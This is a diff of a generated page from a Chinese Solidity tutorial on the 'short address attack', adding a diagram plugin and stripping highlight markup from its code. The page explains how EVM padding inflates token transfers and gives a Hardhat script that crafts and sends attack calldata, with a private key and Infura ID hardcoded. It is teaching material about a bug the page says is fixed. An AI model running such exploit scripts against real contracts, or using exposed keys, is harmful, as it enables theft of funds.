@@ -36,6 +36,10 @@
                 
             
                 
+                <link rel="stylesheet" href="../../gitbook/honkit-plugin-mermaid/mermaid.css">
+                
+            
+                
                 <link rel="stylesheet" href="../../gitbook/@honkit/honkit-plugin-highlight/website.css">
                 
             
@@ -3015,64 +3019,64 @@
                                 
                                 <h1 id="第24节：安全事故14-短地址攻击">第24节：安全事故14-短地址攻击</h1>
 <p>如果传入的 to 是末端缺省的短地址，EVM 会将后面字节补足地址，而最后的 value 值不足则用 0 填充，导致实际转出的代币数值倍增，在执行transfer函数时，原型如下：</p>
-<pre><code class="lang-sh"><span class="hljs-keyword">function</span> transfer(address _to, uint256 _value) returns (bool success)`
+<pre><code class="lang-sh">function transfer(address _to, uint256 _value) returns (bool success)`
 </code></pre>
 <p>在正常情况下，会给EVM传入136位的字节码（不包含0x），示例如下：</p>
 <pre><code class="lang-sh">a9059cbb000000000000000000000000490e588126207a8132c8e002c8554e19cb380b7a000000000000000000000000000000000000000000000000000000003430bca1
 </code></pre>
 <p>但是，如果我们选择的_to地址后面正好有几个0（假设：3个0），而我们刻意将这3个0去掉，那么EVM会自动使用后面的 <code>_value</code>值的高位0对这缺失的3个0进行补位，同时EVM也会在<code>_value</code>后面进行再次3个补零，从而保证136位字节码完整，而这种机制导致的结果就是：原本value是1的时候，从后面补三个零，将value变成了1000，这相当于转账的值放大了1000倍（10^3）。</p>
 <h2 id="代码验证">代码验证</h2>
-<pre><code class="lang-js"><span class="hljs-keyword">import</span> { ethers } <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;hardhat&quot;</span>;
+<pre><code class="lang-js">import { ethers } from &quot;hardhat&quot;;
 
-<span class="hljs-keyword">async</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">main</span>(<span class="hljs-params"></span>) </span>{
-  <span class="hljs-comment">// 0xEAd54777D54C2C1bE1458E749fDfB5d654458309</span>
-  <span class="hljs-keyword">const</span> senderPrivateKey = <span class="hljs-string">&quot;0xa7b0f6c4cddc5c818655f5c0eb9e42f803dcc400ec284521e9092e8b243473c3&quot;</span>
-  <span class="hljs-keyword">const</span> provider_default = <span class="hljs-keyword">new</span> ethers.providers.JsonRpcProvider(<span class="hljs-string">&quot;https://goerli.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161&quot;</span>);
+async function main() {
+  // 0xEAd54777D54C2C1bE1458E749fDfB5d654458309
+  const senderPrivateKey = &quot;0xa7b0f6c4cddc5c818655f5c0eb9e42f803dcc400ec284521e9092e8b243473c3&quot;
+  const provider_default = new ethers.providers.JsonRpcProvider(&quot;https://goerli.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161&quot;);
 
-  <span class="hljs-keyword">let</span> sender = <span class="hljs-keyword">new</span> ethers.Wallet(senderPrivateKey, provider_default)
-  <span class="hljs-comment">// 获取地址，与hardhat原生的不一样</span>
-  <span class="hljs-keyword">let</span> senderAddr = <span class="hljs-keyword">await</span> sender.getAddress()
+  let sender = new ethers.Wallet(senderPrivateKey, provider_default)
+  // 获取地址，与hardhat原生的不一样
+  let senderAddr = await sender.getAddress()
 
-  <span class="hljs-comment">// 提前转入足量的eth和token</span>
-  <span class="hljs-keyword">let</span> balance = <span class="hljs-keyword">await</span> sender.getBalance()
-  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&apos;balance Of Ether: &apos;</span> + balance, <span class="hljs-string">&apos;, sender:&apos;</span>, senderAddr)
+  // 提前转入足量的eth和token
+  let balance = await sender.getBalance()
+  console.log(&apos;balance Of Ether: &apos; + balance, &apos;, sender:&apos;, senderAddr)
 
-  <span class="hljs-keyword">const</span> contractAddr = <span class="hljs-string">&quot;0x11Fe617f76aC652F995E7BA0fE4001F741e6d003&quot;</span>
+  const contractAddr = &quot;0x11Fe617f76aC652F995E7BA0fE4001F741e6d003&quot;
 
-  <span class="hljs-comment">// 这里要加上signer</span>
-  <span class="hljs-keyword">let</span> contractInstance = <span class="hljs-keyword">await</span> ethers.getContractAt(<span class="hljs-string">&quot;Test&quot;</span>, contractAddr, sender)
-  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&apos;contractInstance:&apos;</span>, contractInstance.address);
-  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;balance of sender:&quot;</span>, <span class="hljs-keyword">await</span> contractInstance.BalanceOf(senderAddr))
+  // 这里要加上signer
+  let contractInstance = await ethers.getContractAt(&quot;Test&quot;, contractAddr, sender)
+  console.log(&apos;contractInstance:&apos;, contractInstance.address);
+  console.log(&quot;balance of sender:&quot;, await contractInstance.BalanceOf(senderAddr))
 
-  <span class="hljs-comment">//1. 构造攻击bytecode</span>
-  <span class="hljs-keyword">let</span> transferToCode = contractInstance.interface.encodeFunctionData(<span class="hljs-string">&quot;transferTo&quot;</span>, [<span class="hljs-string">&quot;0xdfca6234eb09125632f8f3c71bf8733073b7cd00&quot;</span>, <span class="hljs-number">123</span>])
-  <span class="hljs-comment">// 0x2ccb1b30000000000000000000000000dfca6234eb09125632f8f3c71bf8733073b7cd00000000000000000000000000000000000000000000000000000000000000007b</span>
-  <span class="hljs-comment">// 0x2ccb1b30000000000000000000000000dfca6234eb09125632f8f3c71bf8733073b7cd000000000000000000000000000000000000000000000000000000000000007b, 剪掉两个0</span>
-  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&apos;transferToCode:&apos;</span>, transferToCode);
+  //1. 构造攻击bytecode
+  let transferToCode = contractInstance.interface.encodeFunctionData(&quot;transferTo&quot;, [&quot;0xdfca6234eb09125632f8f3c71bf8733073b7cd00&quot;, 123])
+  // 0x2ccb1b30000000000000000000000000dfca6234eb09125632f8f3c71bf8733073b7cd00000000000000000000000000000000000000000000000000000000000000007b
+  // 0x2ccb1b30000000000000000000000000dfca6234eb09125632f8f3c71bf8733073b7cd000000000000000000000000000000000000000000000000000000000000007b, 剪掉两个0
+  console.log(&apos;transferToCode:&apos;, transferToCode);
 
-  <span class="hljs-comment">// 2. 发起攻击 </span>
-  <span class="hljs-keyword">const</span> tx = {
-    <span class="hljs-comment">// data: &apos;0x2ccb1b30000000000000000000000000dfca6234eb09125632f8f3c71bf8733073b7cd000000000000000000000000000000000000000000000000000000000000007b&apos;, //invalid data</span>
-    <span class="hljs-attr">data</span>: <span class="hljs-string">&apos;0x2ccb1b30000000000000000000000000dfca6234eb09125632f8f3c71bf8733073b7cd00000000000000000000000000000000000000000000000000000000000000007b&apos;</span>,  <span class="hljs-comment">// valid data</span>
-    <span class="hljs-attr">nonce</span>: <span class="hljs-number">1</span>, <span class="hljs-comment">//你发送交易的帐号的最后一笔交易的 nonce + 1</span>
-    <span class="hljs-attr">gasLimit</span>: <span class="hljs-string">&apos;0x2dc6c0&apos;</span>,
-    <span class="hljs-attr">gasPrice</span>: <span class="hljs-string">&apos;0x2540be400&apos;</span>,
-    <span class="hljs-attr">value</span>: <span class="hljs-string">&apos;0x0&apos;</span>,
-    <span class="hljs-attr">to</span>: contractAddr
+  // 2. 发起攻击 
+  const tx = {
+    // data: &apos;0x2ccb1b30000000000000000000000000dfca6234eb09125632f8f3c71bf8733073b7cd000000000000000000000000000000000000000000000000000000000000007b&apos;, //invalid data
+    data: &apos;0x2ccb1b30000000000000000000000000dfca6234eb09125632f8f3c71bf8733073b7cd00000000000000000000000000000000000000000000000000000000000000007b&apos;,  // valid data
+    nonce: 1, //你发送交易的帐号的最后一笔交易的 nonce + 1
+    gasLimit: &apos;0x2dc6c0&apos;,
+    gasPrice: &apos;0x2540be400&apos;,
+    value: &apos;0x0&apos;,
+    to: contractAddr
   }
 
-  <span class="hljs-keyword">let</span> signedTx = <span class="hljs-keyword">await</span> sender.signTransaction(tx)
-  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&apos;signedTx:&apos;</span>, signedTx);
+  let signedTx = await sender.signTransaction(tx)
+  console.log(&apos;signedTx:&apos;, signedTx);
 
-  <span class="hljs-keyword">let</span> res = <span class="hljs-keyword">await</span> sender.sendTransaction(tx)
-  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;tx hash:&quot;</span>, res.hash);
+  let res = await sender.sendTransaction(tx)
+  console.log(&quot;tx hash:&quot;, res.hash);
 }
 
-<span class="hljs-comment">// We recommend this pattern to be able to use async/await everywhere</span>
-<span class="hljs-comment">// and properly handle errors.</span>
-main().catch(<span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> {
-  <span class="hljs-built_in">console</span>.error(error);
-  process.exitCode = <span class="hljs-number">1</span>;
+// We recommend this pattern to be able to use async/await everywhere
+// and properly handle errors.
+main().catch((error) =&gt; {
+  console.error(error);
+  process.exitCode = 1;
 });
 </code></pre>
 <h2 id="总结：evm已经修复了">总结：EVM已经修复了</h2>
@@ -3112,7 +3116,7 @@ main().catch(<span class="hljs-function">(<span class="hljs-params">error</span>
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"第24节:安全事故14-短地址攻击","level":"1.11.18","depth":2,"next":{"title":"第30节:智能合约编写一般原则","level":"1.11.19","depth":2,"path":"04_合约攻击/30_智能合约编写一般原则.md","ref":"04_合约攻击/30_智能合约编写一般原则.md","articles":[]},"previous":{"title":"第23节:安全事故13-encodePacked攻击","level":"1.11.17","depth":2,"path":"04_合约攻击/23_安全事故13-encodePacked攻击.md","ref":"04_合约攻击/23_安全事故13-encodePacked攻击.md","articles":[]},"dir":"ltr"},"config":{"plugins":["heading-anchors@1.0.3","ga@1.0.1","richquotes@0.0.9","github@2.0.0","language-picker","toggle-chapters","codeblock-label","-search","-lunr","page-toc-button","include-codeblock","js-console"],"root":"./","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"language-picker":{"grid-columns":3},"github":{"url":"https://github.com/dukedaily/solidity-expert"},"codeblock-label":{},"fontsettings":{"theme":"white","family":"sans","size":2},"js-console":{},"richquotes":{"default":false},"heading-anchors":{},"highlight":{},"page-toc-button":{},"ga":{"configuration":"auto","token":"UA-51680040-3"},"include-codeblock":{"check":false,"edit":false,"lang":"","fixlang":false,"template":"default","theme":"chrome","unindent":false},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"toggle-chapters":{}},"theme":"default","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56},"embedFonts":false},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{"esversion":"2022","nodeversion":"18.12.0","npmversion":"8.19.2","triplebackticks":"```","console":"<a class=\"gitbook-plugin-js-console\" aria-hidden=\"true\"></a>"},"language":"cn","gitbook":"*"},"file":{"path":"04_合约攻击/24_安全事故14-短地址攻击.md","mtime":"2023-03-21T14:01:27.000Z","type":"markdown"},"gitbook":{"version":"3.7.3","time":"2024-08-19T22:08:50.792Z"},"basePath":"..","book":{"language":"cn"}});
+            gitbook.page.hasChanged({"page":{"title":"第24节:安全事故14-短地址攻击","level":"1.11.18","depth":2,"next":{"title":"第30节:智能合约编写一般原则","level":"1.11.19","depth":2,"path":"04_合约攻击/30_智能合约编写一般原则.md","ref":"04_合约攻击/30_智能合约编写一般原则.md","articles":[]},"previous":{"title":"第23节:安全事故13-encodePacked攻击","level":"1.11.17","depth":2,"path":"04_合约攻击/23_安全事故13-encodePacked攻击.md","ref":"04_合约攻击/23_安全事故13-encodePacked攻击.md","articles":[]},"dir":"ltr"},"config":{"plugins":["heading-anchors@1.0.3","ga@1.0.1","richquotes@0.0.9","github@2.0.0","language-picker","toggle-chapters","codeblock-label","-search","-lunr","page-toc-button","include-codeblock","js-console","honkit-plugin-mermaid"],"root":"./","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"language-picker":{"grid-columns":3},"github":{"url":"https://github.com/dukedaily/solidity-expert"},"codeblock-label":{},"honkit-plugin-mermaid":{"theme":"default"},"fontsettings":{"theme":"white","family":"sans","size":2},"js-console":{},"richquotes":{"default":false},"heading-anchors":{},"highlight":{},"page-toc-button":{},"ga":{"configuration":"auto","token":"UA-51680040-3"},"include-codeblock":{"check":false,"edit":false,"lang":"","fixlang":false,"template":"default","theme":"chrome","unindent":false},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"toggle-chapters":{}},"theme":"default","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56},"embedFonts":false},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{"esversion":"2022","nodeversion":"18.12.0","npmversion":"8.19.2","triplebackticks":"```","console":"<a class=\"gitbook-plugin-js-console\" aria-hidden=\"true\"></a>"},"language":"cn","gitbook":"*"},"file":{"path":"04_合约攻击/24_安全事故14-短地址攻击.md","mtime":"2023-03-21T14:01:27.000Z","type":"markdown"},"gitbook":{"version":"3.7.3","time":"2024-08-23T16:27:32.019Z"},"basePath":"..","book":{"language":"cn"}});
         });
     </script>
 </div>
@@ -3195,6 +3199,14 @@ main().catch(<span class="hljs-function">(<span class="hljs-params">error</span>
     
         
         <script src="../../gitbook/gitbook-plugin-js-console/console-ui.js"></script>
+        
+    
+        
+        <script src="../../gitbook/honkit-plugin-mermaid/mermaid-load.js"></script>
+        
+    
+        
+        <script src="../../gitbook/honkit-plugin-mermaid/mermaid.min.js"></script>
         
     
         
